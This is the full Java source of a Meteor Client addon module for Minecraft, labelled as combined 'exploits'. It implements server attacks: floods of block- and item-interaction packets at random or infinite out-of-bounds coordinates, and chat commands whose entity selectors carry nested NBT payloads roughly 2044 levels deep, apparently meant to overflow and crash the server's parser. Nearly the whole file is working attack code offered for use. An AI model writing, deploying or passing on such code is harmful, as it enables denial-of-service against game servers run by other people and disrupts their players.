package com.example.addon.modules;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.EnumSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.util.Objects;
import java.util.Random;

public class SnowSafe extends Module {

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    public enum Modes { NoCom, OOB, Item, Chat }

    private final Setting<Modes> mode = sgGeneral.add(new EnumSetting.Builder<Modes>()
            .name("mode")
            .description("Which exploit mode to use")
            .defaultValue(Modes.NoCom)
            .build());

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("Packets per tick for block/item modes")
            .defaultValue(15)
            .min(1)
            .sliderMax(100)
            .build());

    private final Setting<Integer> delay = sgGeneral.add(new IntSetting.Builder()
            .name("delay")
            .description("Delay between chat packets in ms.")
            .defaultValue(1000)
            .min(0)
            .sliderMax(5000)
            .build());

    private final Setting<Integer> payloadSize = sgGeneral.add(new IntSetting.Builder()
            .name("payload-size")
            .description("Nested JSON depth for chat packets")
            .defaultValue(2044)
            .min(1)
            .sliderMax(5000)
            .build());

    private final String[] commands = {
            "minecraft:msg", "tell", "minecraft:tell", "tm", "teammsg", "minecraft:teammsg", "minecraft:w", "minecraft:me"
    };

    private int index;
    private long lastSend;

    public SnowSafe() {
        super(AddonTemplate.CATEGORY, "Dookinqq Safe", "Combined safe exploits: packets & chat selector overflow.");
    }

    // Random block position generator
    private Vec3d pickRandomPos() {
        Random r = new Random();
        return new Vec3d(r.nextInt(0xFFFFFF), 255, r.nextInt(0xFFFFFF));
    }

    // Generates nested JSON payloads
    private String generatePayload(int levels) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < levels; i++) sb.append("{a:");
        sb.append("0");
        for (int i = 0; i < levels; i++) sb.append("}");
        return sb.toString();
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null || mc.getNetworkHandler() == null) return;

        switch (mode.get()) {

            case NoCom -> {
                for (int i = 0; i < amount.get(); i++) {
                    Vec3d cpos = pickRandomPos();
                    mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(
                            Hand.MAIN_HAND,
                            new BlockHitResult(cpos, Direction.DOWN, BlockPos.ofFloored(cpos), false),
                            0
                    ));
                }
            }

            case OOB -> {
                Vec3d oob = new Vec3d(Double.POSITIVE_INFINITY, 255, Double.NEGATIVE_INFINITY);
                mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(
                        Hand.MAIN_HAND,
                        new BlockHitResult(oob, Direction.DOWN, BlockPos.ofFloored(oob), false),
                        0
                ));
            }

            case Item -> {
                for (int i = 0; i < amount.get(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerInteractItemC2SPacket(
                            Hand.MAIN_HAND, 0, 0.0f, 0.0f
                    ));
                }
            }

            case Chat -> {
                if (System.currentTimeMillis() - lastSend < delay.get()) return;
                lastSend = System.currentTimeMillis();

                if (index >= commands.length) {
                    index = 0;
                    toggle(); // Disable module after full cycle
                    return;
                }

                String payload = generatePayload(payloadSize.get());
                String selector = "@a[nbt=" + payload + "]";
                String fullCommand = commands[index] + " " + selector;

                Objects.requireNonNull(mc.getNetworkHandler())
                        .sendChatMessage(fullCommand);

                index++;
            }
        }
    }
}


